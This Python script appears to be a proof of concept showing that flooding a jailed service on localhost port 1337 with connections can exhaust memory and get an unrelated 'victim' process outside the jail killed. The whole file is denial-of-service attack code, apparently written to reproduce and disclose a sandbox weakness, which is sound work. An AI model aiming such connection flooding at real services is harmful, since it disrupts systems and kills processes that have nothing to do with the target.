import socket, time
from threading import Thread
from multiprocessing.pool import ThreadPool
from multiprocessing import Process
from argparse import ArgumentParser
from datetime import datetime

ITER = 500
def connect_thread(tnum):
    for i in range(ITER):
        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientsocket.connect(('localhost', 1337))
        while True:
            try:
                t = clientsocket.recv(1024)
                if b"done" in t:
                    break
            except Exception as e:
                print(f"{e}")
                break

# a thread consuming only a modest amount of memory (<10GB), outside of the jail
# if you do not have enough memory for the victim alone, just lower the number in the sum
def victim_thread():
    print(f"victim started at {datetime.now()}")

    while True:
        res = sum([1] * 1000000000)

def victim_watcher(p):
    while True:
        if not p.is_alive():
            print(f"victim is dead at {datetime.now()}")
            break
        time.sleep(1)


def main():
    ap = ArgumentParser()
    ap.add_argument("--nthread", type=int, default=10)
    ap.parse_args()

    args = ap.parse_args()

    p = Process(target=victim_thread)
    p.start()

    t = Thread(target=victim_watcher, args=(p,))
    t.start()

    with ThreadPool(args.nthread) as p:
        list(p.imap_unordered(connect_thread, range(args.nthread)))


if __name__ == "__main__":
    main()
